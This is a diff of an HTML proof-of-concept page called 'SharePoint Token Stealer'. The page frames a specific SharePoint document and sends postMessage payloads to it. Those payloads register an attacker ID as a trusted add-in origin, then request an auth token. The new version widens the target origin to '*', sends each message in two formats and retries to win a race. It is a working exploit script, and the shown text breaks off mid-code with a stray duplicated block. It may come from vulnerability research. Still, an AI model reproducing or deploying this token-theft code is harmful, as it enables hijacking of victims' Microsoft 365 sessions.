@@ -1,36 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SharePoint PoC</title>
+    <title>SharePoint PoC V2</title>
 </head>
 <body>
     <h1>SharePoint Token Stealer</h1>
     
-    <!-- THE TARGET IFRAME -->
+    <!-- THE TARGET IFRAME (Official Embed) -->
     <iframe id="sharepoint-frame" 
             src="https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&amp;action=embedview" 
-            style="width:100%; height:500px;">
+            width="476px" height="288px" frameborder="0">
     </iframe>
 
     <script>
         // Malicious Page Script
-        const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
+        // Use "*" for PoC stability (in real attack, target specific origin)
+        const targetOrigin = "*";
         const exploitId = "HACKER_ID";
         
-        // Wait for iframe to load
         const iframe = document.getElementById("sharepoint-frame");
         
         iframe.onload = function() {
             const targetWindow = iframe.contentWindow;
-            console.log("Iframe loaded, starting exploit...");
+            console.log("Iframe loaded, starting exploit sequence...");
+
+            // Helper to send messages in multiple formats (Object & JSON String)
+            // varying browser/app versions handle postMessage data differently
+            function send(payload) {
+                try { targetWindow.postMessage(payload, targetOrigin); } catch(e) {} // Send as Object
+                try { targetWindow.postMessage(JSON.stringify(payload), targetOrigin); } catch(e) {} // Send as String
+            }
 
             // 1. Register Malicious Origin as Trusted
-            const registerPayload = JSON.stringify({
+            const registerPayload = {
                 MessageId: "AddinTrustedOrigin",
                 AddinTrustId: exploitId
-            });
-            targetWindow.postMessage(registerPayload, targetOrigin);
-            console.log("Sent registration");
+            };
+            send(registerPayload);
+            console.log("Sent registration (Dual Format)");
+
+            // 2. Request Auth Token (Repeated attempts to catch race conditions)
+            let attempts = 0;
+            const interval = setInterval(() => {
+                attempts++;
+                if(attempts > 5) clearInterval(interval);
+                
+                const tokenPayload = {
+                    MessageId: "GetAuthToken",
+                    AddinTrustId: exploitId,
+                    Resource: window.location.origin 
+                };
+                send(tokenPayload);
+                console.log("Sent token request attempt " + attempts);
+            }, 1000);
+        };
 
             // 2. Request Auth Token (after short delay)
             setTimeout(() => {
